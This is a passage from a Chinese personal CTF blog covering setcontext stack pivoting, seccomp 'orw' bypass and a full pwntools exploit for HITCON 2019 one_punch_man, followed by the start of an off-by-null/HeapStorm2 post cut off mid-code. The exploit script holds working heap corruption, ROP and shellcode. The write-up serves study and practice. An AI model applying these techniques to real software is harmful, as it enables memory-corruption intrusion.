[rdi+0x70]</span><br><span class="line">   0x00007fc35bf5f1e3 &lt;+99&gt;:	mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">   0x00007fc35bf5f1ea &lt;+106&gt;:	mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">   0x00007fc35bf5f1f1 &lt;+113&gt;:	mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">   0x00007fc35bf5f1f5 &lt;+117&gt;:	mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">   0x00007fc35bf5f1f9 &lt;+121&gt;:	mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">   0x00007fc35bf5f1fd &lt;+125&gt;:	xor    eax,eax</span><br><span class="line">   0x00007fc35bf5f1ff &lt;+127&gt;:	ret    </span><br><span class="line">   0x00007fc35bf5f200 &lt;+128&gt;:	mov    rcx,QWORD PTR [rip+0x398c61]        # 0x7fc35c2f7e68</span><br><span class="line">   0x00007fc35bf5f207 &lt;+135&gt;:	neg    eax</span><br><span class="line">   0x00007fc35bf5f209 &lt;+137&gt;:	mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">   0x00007fc35bf5f20c &lt;+140&gt;:	or     rax,0xffffffffffffffff</span><br><span class="line">   0x00007fc35bf5f210 &lt;+144&gt;:	ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不是跳到setcontext的开头，而是跳到53这个位置，当执行下面的代码后，就可以通过rip给很多寄存器赋值，包括rsp，还能通过rcx控制栈顶信息，操作手法就是先通过rdi+0xa0把rsp指向我们伪造的rop的地址，然后再通过rdi+0xa8让rcx储存ret的地址，然后把ret的地址push到栈上，最后的执行顺序就是这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x7fe87be4e1ff &lt;setcontext+127&gt;        ret  //自己的ret  </span><br><span class="line">    ↓</span><br><span class="line">0x7fe87bdfc8aa                         ret  //push rcx  </span><br><span class="line">    ↓</span><br><span class="line">0x7fe87be1d5bf &lt;init_cacheinfo+239&gt;    pop    rdi//伪造的rop</span><br><span class="line">0x7fe87be1d5c0 &lt;init_cacheinfo+240&gt;    ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后还可以通过rop再把程序流跳到别的地方，很好玩。</p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>当有些程序被沙箱保护后就不能直接调用system(“/bin/sh”)来拿到权限了，比如这个程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@ubuntu:~/get-shell/tcache/HITCON 2019 one_punch_man$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>只允许程序调用read,write,open和mprotect这几个我认识的函数，那就只能orw了，不过现在在我看来orw有两种类型，一种是构造rop来完成打印flag,一种是直接构造代码，让他执行orw代码（不过这种需要mprotect协助），调用orw需要通过系统调用来完成，即syscall,每个函数都对应一个调用号，比如open的调用号是2，read的调用号是0，write的调用号是1,调用时对rax赋值就行。</p>
<p>完成前置知识，下面具体题目具体分析</p>
<h4 id="HITCON-2019-one-punch-man"><a href="#HITCON-2019-one-punch-man" class="headerlink" title="HITCON 2019 one_punch_man"></a>HITCON 2019 one_punch_man</h4><p>算是复现的最艰难的一道题，除了一些不知道的glibc的特性以外，还因为按照wiki上的思路复现的代码就跑不通，最后自己想出来一个这个笨办法。</p>
<p>源码太长就不看了，主要有四个功能，漏洞是ufa,然后一般情况下只能使用calloc,calloc不能使用tcache上面的堆，其次堆的大小设置为大于0x80,意味着也不能使用fastbin上面的堆，在glibc高版本的情况下使用出fast和tcache的堆拿到程序流很难，好在程序给了后门函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_15BB</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(qword_4030 + <span class="number">32</span>) &lt;= <span class="number">6</span> )</span><br><span class="line">    error(<span class="string">&quot;gg&quot;</span>, a2);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x217</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !buf )</span><br><span class="line">    error(<span class="string">&quot;err&quot;</span>, a2);</span><br><span class="line">  <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, <span class="number">0x217</span>uLL) &lt;= <span class="number">0</span> )</span><br><span class="line">    error(<span class="string">&quot;io&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Serious Punch!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;unk_2128);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要让这个地址的数大于6就行，当一个地址的数变大首先想到了unsortedattackbin，但libc.2.27.so已经对unsortedbin上面的堆严加管控，当一个堆脱离时，会严格检查fd和bk，通过wiki得知smallbin配合tcache也可以完成类似的行为，比如先让tcache上面的0x200的bin上六个堆，让smallbin的0x200上面上2个堆，然后申请0x200,首先会分配smallbin上面的一个堆给你，让后把另一个堆脱链放入tcache上面，只要更改后面的bk，让其脱链的时候就可以向bk-&gt;fd写入一个地址了，这个地址肯定很大，和unsortedbin的思路很像。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x130 [  6]: 0x55563b0fa850 —▸ 0x55563b0fa720 —▸ 0x55563b0fa5f0 —▸ 0x55563b0fa4c0 —▸ 0x55563b0fa390 —▸ 0x55563b0fa260 ◂— 0x0</span><br><span class="line">0x210 [  7]: 0x55563b0fb5e0 —▸ 0x55563b0fb3d0 —▸ 0x55563b0fb1c0 —▸ 0x55563b0fafb0 —▸ 0x55563b0fada0 —▸ 0x55563b0fab90 —▸ 0x55563b0fa980 ◂— 0x0</span><br><span class="line">0x220 [  1]: 0x55563b0fe8f0 ◂— 0x0</span><br><span class="line">0x410 [  7]: 0x55563b0fd8b0 —▸ 0x55563b0fd4a0 —▸ 0x55563b0fd090 —▸ 0x55563b0fcc80 —▸ 0x55563b0fc870 —▸ 0x55563b0fc460 —▸ 0x55563b0fc050 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x130: 0x55563b0fdf90 —▸ 0x55563b0fbd00 —▸ 0x7f0f0340adc0 (main_arena+384) ◂— 0x55563b0fdf90</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意修改bk的时候也得让fd有意义，不然fd-&gt;bk=bk就会不成立</p>
<p>修改完后就可以使用malloc了，哦对当smallbin上的堆进入tcache上面时tcache就会出问题，不能进只能出，所以0x217得先准备好才行。</p>
<p>脚本</p>
<p>网上搜了一圈，没有像我做的这复杂的，我是用mprotect做的</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">idx,name</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;idx: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;hero name: &quot;</span>)</span><br><span class="line">    sh.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dock</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;50056&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">retire</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">6</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">libc_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;hero name: &#x27;</span>)</span><br><span class="line">heap_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x720</span>-<span class="number">0xcb0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xd0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">    retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">retire(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x217</span>)</span><br><span class="line">retire(<span class="number">2</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x131</span>)+p64(heap_base+<span class="number">0x1d00</span>)+p64(heap_base+<span class="number">0x17</span>+<span class="number">4</span>)</span><br><span class="line">rename(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x120</span>)</span><br><span class="line">rename(<span class="number">2</span>,p64(libc_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">dock(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">setcontext = libc_addr+libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">53</span></span><br><span class="line">dock(p64(setcontext))</span><br><span class="line">ret=libc_addr+<span class="number">0x00000000000008aa</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x215bf</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x0000000000023eea</span></span><br><span class="line">pop_rdx=libc_addr+<span class="number">0x0000000000001b96</span></span><br><span class="line">mprotect_addr=libc_addr+libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">rename(<span class="number">0</span>,<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line">flag_addr=heap_base+<span class="number">0x1d10</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,&#123;0&#125;</span></span><br><span class="line"><span class="string">mov rdi, rax</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">mov rax, 2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rax, rax</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rsi, &#123;1&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x25</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax, 1</span></span><br><span class="line"><span class="string">mov rdi, 1</span></span><br><span class="line"><span class="string">mov rsi, &#123;2&#125;</span></span><br><span class="line"><span class="string">mov rdx,0x25</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> .<span class="built_in">format</span>( flag_addr,heap_base+<span class="number">0x48f0</span>,heap_base+<span class="number">0x48f0</span>)</span><br><span class="line">rename(<span class="number">1</span>,asm(shellcode,arch=<span class="string">&#x27;amd64&#x27;</span>))</span><br><span class="line">shellcode_addr=heap_base+<span class="number">0x44e0</span></span><br><span class="line">mprotect_rop=p64(pop_rdi)+p64(heap_base)+p64(pop_rsi)+p64(<span class="number">0x6000</span>)+p64(pop_rdx)+p64(<span class="number">7</span>)+p64(mprotect_addr)+p64(shellcode_addr)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>)</span><br><span class="line">rename(<span class="number">0</span>,mprotect_rop)</span><br><span class="line">rop_addr=heap_base+<span class="number">0x4b10</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">300</span>)</span><br><span class="line">rename(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xa0</span>+p64(rop_addr)+p64(ret))</span><br><span class="line"></span><br><span class="line">retire(<span class="number">1</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
























      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/26/off-by-null/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/26/off-by-null/" class="post-title-link" itemprop="url">off by null</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-26 16:02:02 / 修改时间：16:02:28" itemprop="dateCreated datePublished" datetime="2021-11-26T16:02:02+08:00">2021-11-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="aoff-by-null"><a href="#aoff-by-null" class="headerlink" title="aoff by null"></a>aoff by null</h1><p>简单地说就是堆溢出只能溢出一个字节，而且溢出的这个字节是\x00,如果我们申请的堆是以8结束的，那就刚好可以修改下一个chunk的size的最后一个字节为\x00</p>
<p>这个漏洞也是单个自己没啥用，一般配合unlink达成overlap(好像是这么叫的)。</p>
<p>大致思路就是free时触发unlink但是不是合并这个chunk的上一个chunk，而是合并上上个chunk，这样新合并的chunk里就含有一个没有free的堆，此时这个堆还有一个指针指向他，然后再把他申请出来，这样就有两个指针指向他了，构成了ufa</p>
<p>就用heapstorm2来实现offbynull</p>
<p>下面是源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_D92</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Allocate&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Update&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Delete&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. View&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. Exit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Command: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这是几个功能</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">add</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_BCC(a1, *(_QWORD *)(<span class="number">16</span> * (i + <span class="number">2LL</span>) + a1 + <span class="number">8</span>)) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_1551();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">12</span> &amp;&amp; v2 &lt;= <span class="number">4096</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_QWORD *)(<span class="number">16</span> * (i + <span class="number">2LL</span>) + a1 + <span class="number">8</span>) = sub_BCC(a1, v2);</span><br><span class="line">        *(_QWORD *)(<span class="number">16</span> * (i + <span class="number">2LL</span>) + a1) = sub_BB0(a1, v3);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Chunk %d 